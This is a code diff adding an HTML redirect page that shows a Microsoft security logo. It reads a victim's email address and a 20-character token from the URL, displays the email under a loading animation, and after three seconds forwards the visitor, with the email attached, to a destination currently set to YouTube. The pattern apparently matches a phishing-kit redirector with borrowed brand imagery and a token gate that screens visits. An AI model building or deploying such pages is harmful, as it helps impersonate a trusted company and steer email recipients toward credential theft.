@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #f4f4f4;
+        }
+
+        .dots-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .dot {
+            background-color: #3498db;
+            border-radius: 50%;
+            width: 10px;
+            height: 10px;
+            margin: 5px;
+            animation: grow 1.5s infinite ease-in-out;
+        }
+
+        .dot:nth-child(2) { animation-delay: 0.1s; }
+        .dot:nth-child(3) { animation-delay: 0.2s; }
+        .dot:nth-child(4) { animation-delay: 0.3s; }
+        .dot:nth-child(5) { animation-delay: 0.4s; }
+
+        @keyframes grow {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.5); }
+        }
+
+        #emailDisplay {
+            color: #3498db;
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+    </style>
+    <script>
+        function getEmailFromURL() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('email');
+        }
+
+        function isValidBase64() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const base64 = urlParams.get('b');
+            return /^[A-Za-z0-9+\/]{20}$/.test(base64);
+        }
+
+        function updateLink() {
+            const email = getEmailFromURL();
+            const link = document.getElementById('redirectLink');
+            const emailDisplay = document.getElementById('emailDisplay');
+            emailDisplay.innerText = email || 'No email provided'; // Display the email
+            if (email && isValidBase64()) {
+                link.href = `https://youtube.com/?email=${encodeURIComponent(email)}`;
+                window.setTimeout(() => window.location.href = link.href, 3000);
+            }
+        }
+
+        window.onload = updateLink;
+    </script>
+</head>
+<body>
+    <div style="text-align: center;">
+        <!-- Original Logo -->
+        <img src="https://d15shllkswkct0.cloudfront.net/wp-content/blogs.dir/1/files/2023/12/microsoftsecurity.png" alt="Logo" width="130px">
+        <!-- Email display -->
+        <div id="emailDisplay"></div>
+        <!-- Loader (dots) displayed below the email -->
+        <div class="dots-container">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+    </div>
+    <a id="redirectLink" href="#" style="display: none;" title="Redirect to YouTube"></a>
+</body>
+</html>
